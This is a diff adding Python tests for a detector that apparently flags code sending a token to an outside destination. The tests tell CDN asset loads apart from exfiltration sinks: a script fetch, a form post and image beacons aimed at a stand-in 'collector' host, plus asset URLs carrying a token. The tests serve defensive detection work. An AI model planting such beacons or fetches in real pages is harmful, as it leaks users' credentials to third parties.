@@ -102,3 +102,51 @@ class TestOnlyANamedLookup:
             f"'security {LOOKUP} -s ' + SERVICE + ' -w'",
         )
         assert not Keychain.owned(text, {5})
+
+
+class TestAStaticAssetInAPageIsNotADestination:
+    """B1(a), reviews/pypi-98/20: the dashboard serves a page that loads a script from a CDN. That URL is
+    fetched by a person's browser, not sent the token by this file; a request URL, a form action, an image
+    with a query string, a URL built from parts and an asset URL carrying the token all keep counting."""
+
+    @staticmethod
+    def with_page(markup: str) -> str:
+        return DASHBOARD + f"PAGE = '''{markup}'''\n"
+
+    def test_a_script_loaded_from_a_cdn_is_not_a_second_issuer(self):
+        page = (
+            '<script src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>'
+        )
+        assert Keychain.owned(self.with_page(page), {5})
+
+    def test_a_stylesheet_and_a_font_are_assets_too(self):
+        page = (
+            '<link rel="stylesheet" href="https://fonts.example.invalid/css/site.css">'
+            "<link href='https://cdn.example.invalid/f/a.woff2' rel=preload>"
+        )
+        assert Keychain.owned(self.with_page(page), {5})
+
+    def test_a_page_script_that_fetches_is_a_destination(self):
+        page = '<script>fetch("https://collector.example.invalid/t")</script>'
+        assert not Keychain.owned(self.with_page(page), {5})
+
+    def test_a_form_action_is_a_destination(self):
+        page = '<form action="https://collector.example.invalid/t" method="post"></form>'
+        assert not Keychain.owned(self.with_page(page), {5})
+
+    def test_an_image_with_a_query_string_is_a_destination(self):
+        page = '<img src="https://collector.example.invalid/p.png?v=1">'
+        assert not Keychain.owned(self.with_page(page), {5})
+
+    def test_an_asset_url_that_carries_a_value_is_a_destination(self):
+        for url in (
+            "https://cdn.example.invalid/a.js?t={token}",
+            "https://cdn.example.invalid/a.js?t=%s",
+            "https://cdn.example.invalid/a.js?t=$TOKEN",
+        ):
+            assert not Keychain.owned(self.with_page(f'<script src="{url}"></script>'), {5}), url
+
+    def test_an_asset_host_that_is_also_a_request_destination_is_not_excused(self):
+        text = self.with_page('<script src="https://cdn.example.invalid/a.js"></script>')
+        text += "urllib.request.urlopen('https://cdn.example.invalid/upload')\n"
+        assert not Keychain.owned(text, {5})
